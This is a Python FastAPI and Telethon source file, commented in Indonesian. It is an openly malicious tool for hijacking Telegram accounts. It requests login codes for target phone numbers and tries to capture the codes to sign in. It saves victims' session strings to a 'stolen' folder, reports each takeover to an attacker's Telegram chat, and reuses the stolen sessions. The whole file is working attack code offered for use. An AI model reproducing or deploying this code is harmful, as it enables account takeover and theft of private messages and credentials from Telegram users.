from fastapi import FastAPI, Request
from telethon import TelegramClient, events
from telethon.sessions import StringSession
import asyncio
import os
import re
import uvicorn

app = FastAPI()

# ENV
API_ID = int(os.getenv('API_ID'))
API_HASH = os.getenv('API_HASH')
PHONE = os.getenv('PHONE')
BOT_TOKEN = os.getenv('BOT_TOKEN')
CHAT_ID = int(os.getenv('CHAT_ID'))

# Cek ENV
if not all([API_ID, API_HASH, PHONE, BOT_TOKEN, CHAT_ID]):
    raise RuntimeError("Set semua variable di Railway, brengsek!")

client = TelegramClient('jinx_listener', API_ID, API_HASH)
listening = {}
sessions = {}
OTP_PATTERN = re.compile(r'\b(\d{5})\b')

@app.post("/start_listen")
async def start_listen(req: Request):
    data = await req.json()
    phone = data['phone']

    temp_client = TelegramClient(StringSession(), API_ID, API_HASH)
    await temp_client.connect()

    try:
        sent = await temp_client.send_code_request(phone)
        listening[phone] = {'client': temp_client, 'hash': sent.phone_code_hash}

        @temp_client.on(events.NewMessage(incoming=True))
        async def handler(event):
            if OTP_PATTERN.search(event.message.message):
                code = OTP_PATTERN.search(event.message.message).group(1)
                await auto_login(phone, code)

        await client.send_message(CHAT_ID, f"TARGET: `{phone}`\nMenunggu OTP...")
        return {"success": True}
    except Exception as e:
        return {"success": False, "error": str(e)}

async def auto_login(phone, code):
    if phone not in listening: return
    data = listening[phone]
    client_temp = data['client']
    hash_ = data['hash']

    try:
        await client_temp.sign_in(phone, code, phone_code_hash=hash_)
        me = await client_temp.get_me()
        auth = client_temp.session.save()

        os.makedirs("stolen", exist_ok=True)
        with open(f"stolen/{phone.replace('+','')}.session", "w") as f:
            f.write(auth)

        sessions[phone] = auth
        msg = f"SESSION DICURI!\nUser: {me.first_name}\nPhone: `{phone}`\n/login {phone}"
        await client.send_message(CHAT_ID, msg)
        del listening[phone]
    except Exception as e:
        await client.send_message(CHAT_ID, f"Gagal: {str(e)}")

@app.get("/request_otp/{phone}")
async def request_otp(phone: str):
    if phone not in sessions:
        return {"success": False, "error": "No session"}
    
    stolen = TelegramClient(StringSession(sessions[phone]), API_ID, API_HASH)
    await stolen.connect()
    await stolen.start()
    await stolen.send_code_request(phone)
    return {"success": True}

# Startup
@app.on_event("startup")
async def startup():
    await client.start(bot_token=BOT_TOKEN)
    os.makedirs("stolen", exist_ok=True)
    print("JINX BOT HIDUP – SIAP CURI SESSION!")

if __name__ == "__main__":
    uvicorn.run("main:app", host="0.0.0.0", port=8080, log_level="info")
